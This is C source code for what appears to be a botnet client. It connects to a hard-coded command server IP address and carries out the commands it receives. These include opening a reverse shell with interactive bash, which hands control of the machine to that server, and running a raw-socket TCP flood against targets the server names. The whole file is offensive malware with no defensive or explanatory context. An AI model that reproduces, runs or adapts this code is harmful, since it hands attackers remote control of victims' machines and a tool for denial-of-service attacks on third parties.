#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/wait.h>

#define IP "31.172.69.5"
// 75.130.243.162
#define PORT 9001
#define SHELLPORT 9002

typedef struct {
    const char *target_ip;
    int target_port;
    int packet_size;
    int num_packets;
} AttackParams;

void tcp_flood(const char* destination_ip, int destination_port, int packet_count, int data_size) {
    int sockfd;
    struct sockaddr_in dest_addr;
    char buffer[data_size];

    // Create socket
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Prepare destination address
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(destination_port);
    if (inet_pton(AF_INET, destination_ip, &dest_addr.sin_addr) <= 0) {
        perror("inet_pton");
        exit(EXIT_FAILURE);
    }

    // Prepare TCP packet payload (data)
    memset(buffer, 'A', data_size); // Fill buffer with 'A's (adjust as needed)

    // Send TCP packets
    for (int i = 0; i < packet_count; i++) {
        if (sendto(sockfd, buffer, data_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("sendto");
            exit(EXIT_FAILURE);
        }
    }

    // Close socket
    close(sockfd);
}

char** splitStringBySpace(const char* str) {
    char** result = NULL;
    char* temp = strdup(str); // Duplicate the string to avoid modifying the original
    char* token = strtok(temp, " ");
    int count = 0;

    // Count the number of tokens
    while (token != NULL) {
        count++;
        token = strtok(NULL, " ");
    }

    // Allocate memory for the result array
    result = (char**)malloc((count + 1) * sizeof(char*));
    if (result == NULL) {
        free(temp);
        return NULL; // Memory allocation failed
    }

    // Reset the string to the beginning
    token = strtok(temp, " ");

    // Fill the result array with tokens
    for (int i = 0; i < count; i++) {
        result[i] = strdup(token);
        token = strtok(NULL, " ");
    }

    // Add a NULL pointer at the end to indicate the end of the array
    result[count] = NULL;

    free(temp); // Free the duplicated string
    return result;
}

void shell_process_function(int client_socket) {
    int client_socket_shell = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in client_addr_shell;
    client_addr_shell.sin_family = AF_INET;
    client_addr_shell.sin_port = htons(SHELLPORT);
    client_addr_shell.sin_addr.s_addr = inet_addr(IP);

    int connection = connect(client_socket_shell, (struct sockaddr*) &client_addr_shell, sizeof(client_addr_shell));
    char message[100];
    if (connection < 0) {
        strcpy(message, "Socket To Shell Connection Failed.");
    } else {
        strcpy(message, "Socket To Shell Connection Established Successfully.");
    }

    send(client_socket, message, strlen(message), 0);

    dup2(client_socket_shell, 0);
    dup2(client_socket_shell, 1);
    dup2(client_socket_shell, 2);
    execl("/bin/bash", "bash", "-i", NULL);

    // If execl fails, print an error message
    perror("execl failed");
    exit(EXIT_FAILURE);
}

int main() {
    char buffer[500];
    int client_socket = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in client_addr;
    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(PORT);
    client_addr.sin_addr.s_addr = inet_addr(IP);

    connect(client_socket, (struct sockaddr*) &client_addr, sizeof(client_addr));
    printf("Connected To Server. \n");

    while (1) {
        ssize_t bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
        if (bytes_received < 0) {
            perror("recv");
            exit(EXIT_FAILURE);
        } else if (bytes_received == 0) {
            printf("Server closed the connection.\n");
            break;
        } else {
            const char* str = buffer;
            printf("Buffer now: %s", str);
            char** tokens = splitStringBySpace(str);
            if (tokens == NULL) {
                    printf("Memory allocation failed.\n");
            }

            char main_command[150];
            strcpy(main_command, tokens[0]);
            printf("Received: '%s' \n", buffer);
            if (strcmp(main_command, "shell") == 0) {
                int pid = fork();
                if (pid == 0) {
                    // Child process: handle shell connection
                    shell_process_function(client_socket);
                } else if (pid > 0) {
                    // Parent process: continue listening for commands
                    continue;
                } else {
                    perror("fork failed");
                    exit(EXIT_FAILURE);
                }
            } else if (strcmp(main_command, "info") == 0) {
                char message[10] = "info";
                send(client_socket, message, sizeof(message), 0);
            } else if (strcmp(main_command, "DDOS") == 0) {
                printf("The command has been recieved: DDOS\n");
                const char* destination_ip = tokens[1];
                int destination_port = atoi(tokens[2]);
                int packet_size = atoi(tokens[3]);
                int packet_count = atoi(tokens[4]);
                int data_size = atoi(tokens[5]);
                printf("%s %d %d %d %d", destination_ip, destination_port, packet_size, packet_count, data_size);
                    // Fork a new process
                pid_t pid = fork();

                if (pid == -1) {
                        // Error handling for fork
                        perror("fork");
                        //exit(EXIT_FAILURE);
                        char message[15] = "Attack failed";
                        send(client_socket, message, sizeof(message), 0);
                } else if (pid == 0) {
                        // Child process: execute TCP flooding function
                        tcp_flood(destination_ip, destination_port, packet_count, data_size);
                        exit(EXIT_SUCCESS); // Child process exits after flooding
                } else {
                        char message[15] = "Begun Attack";
                        send(client_socket, message, sizeof(message), 0);
                }     
            } else {
                char message[40] = "command not recognized";
                send(client_socket, message, sizeof(message), 0);
            }
            memset(buffer, 0, sizeof(buffer));
            memset(main_command, 0, sizeof(main_command));
        }
    }

    close(client_socket);
    return 0;
}
